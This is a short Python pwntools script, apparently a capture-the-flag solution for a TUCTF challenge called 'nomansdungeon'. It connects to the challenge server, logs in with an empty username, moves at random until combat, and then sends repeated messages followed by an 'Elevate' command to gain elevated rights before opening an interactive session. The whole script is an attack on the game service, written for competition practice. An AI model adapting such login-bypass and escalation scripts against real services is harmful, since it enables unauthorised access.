import random
from pwn import *

r = remote("nomansdungeon.tuctf.com", 6666)

def meet_monster():
    directions = [ "N", "S", "E", "W" ]
    while True:
        resp = r.recv(10000)
        print resp
        if "ENTER COMBAT" in resp:
            break
        r.sendline(random.choice(directions))

def elevate():
    for i in range(20):
        r.sendline("m")
        resp = r.recv(10000)
        print resp
        r.sendline("no other players")
        resp = r.recv(10000)
        print resp

    r.sendline("Elevate")

# login with empty username
print r.recv(10000)
r.sendline("")

# move randomly until we meet a monster
meet_monster()

# attack the monster
r.sendline("A")
print r.recv(10000)
r.sendline("y")
r.recv(10000)

# send message to admin
elevate()

r.interactive()
